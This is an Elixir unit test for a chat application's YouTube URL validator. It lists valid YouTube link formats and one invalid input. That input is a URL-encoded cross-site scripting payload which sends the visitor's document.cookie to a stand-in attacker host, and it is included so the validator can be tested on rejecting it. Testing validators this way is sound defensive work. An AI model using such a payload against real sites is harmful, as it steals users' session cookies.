defmodule KlziiChat.Services.Validations.Resources do
  use ExUnit.Case, async: true
  alias KlziiChat.Services.Validations.Resource, as: ResourceValidations

  describe "youtube_url_validator" do
    test "youtube_url_validator" do
      valid_youtube_links = %{
        a: "http://www.youtube.com/watch?v=0zM3nApSvMg&feature=feedrec_grec_index",
        b: "http://www.youtube.com/user/IngridMichaelsonVEVO#p/a/u/1/QdK8U-VIH_o",
        c: "http://www.youtube.com/v/0zM3nApSvMg?fs=1&amp;hl=en_US&amp;rel=0",
        d: "http://www.youtube.com/watch?v=0zM3nApSvMg#t=0m10s",
        f: "http://www.youtube.com/embed/0zM3nApSvMg?rel=0",
        g: "http://www.youtube.com/watch?v=0zM3nApSvMg",
        k: "http://youtu.be/0zM3nApSvMg"
      }
        invalid_youtube_links = %{
          a: "http://www.welp.com/?search=%3Cscript%3Ewindow.location=%22http://www.haxxed.com?cookie=%22+document.cookie%3C/script%3E"
        }

        assert({:ok} = ResourceValidations.youtube_url_validator(valid_youtube_links.a))
        assert({:ok} = ResourceValidations.youtube_url_validator(valid_youtube_links.b))
        assert({:ok} = ResourceValidations.youtube_url_validator(valid_youtube_links.c))
        assert({:ok} = ResourceValidations.youtube_url_validator(valid_youtube_links.d))
        assert({:ok} = ResourceValidations.youtube_url_validator(valid_youtube_links.f))
        assert({:ok} = ResourceValidations.youtube_url_validator(valid_youtube_links.g))
        assert({:ok} = ResourceValidations.youtube_url_validator(valid_youtube_links.k))

        assert({:error, _} = ResourceValidations.youtube_url_validator(invalid_youtube_links.a))
    end
  end
end
